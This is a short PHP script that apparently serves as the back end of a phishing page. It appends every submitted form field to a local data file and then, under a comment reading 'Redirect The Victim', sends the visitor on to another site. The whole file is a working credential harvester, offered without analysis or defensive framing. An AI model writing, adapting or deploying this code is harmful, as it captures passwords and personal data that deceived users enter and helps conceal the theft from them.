<?php
	file_put_contents("data.txt", implode("\n \nNEW DATA \n", $_POST) , FILE_APPEND | LOCK_EX );
	//Redirect The Victim
	header("location:http://example.com");
 ?>